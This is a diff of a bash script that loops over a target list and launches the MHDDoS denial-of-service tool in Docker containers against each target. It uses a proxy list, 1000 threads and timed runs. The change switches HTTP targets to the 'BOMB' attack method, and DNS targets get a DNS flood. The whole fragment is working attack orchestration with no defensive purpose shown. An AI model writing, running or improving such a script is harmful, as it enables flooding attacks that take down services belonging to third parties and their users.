@@ -76,7 +76,7 @@ while :; do
     for ran_targ in $(shuf -i 0-$(($NUM_TARGETS-1))); do
         echo -e "$(date +"%F %H:%M") INFO: RUN $run TARGET ${TARGETS[$ran_targ]}" | tee -a $LOG_PATH
         if [ -n "$(echo ${TARGETS[$ran_targ]} | grep http)" ]; then
-                docker run -d --rm local/mhddos DOWNLOADER ${TARGETS[$ran_targ]} 5 1000 proxies.txt 61 $TIME_EACH | tee -a $LOG_PATH
+                docker run -d --rm local/mhddos BOMB ${TARGETS[$ran_targ]} 5 1000 proxies.txt 61 $TIME_EACH | tee -a $LOG_PATH
         elif [ -n "$(echo ${TARGETS[$ran_targ]} | grep -w "53" )" ]; then
                 docker run -d --rm local/mhddos DNS ${TARGETS[$ran_targ]} 1000 $TIME_EACH | tee -a $LOG_PATH
         else
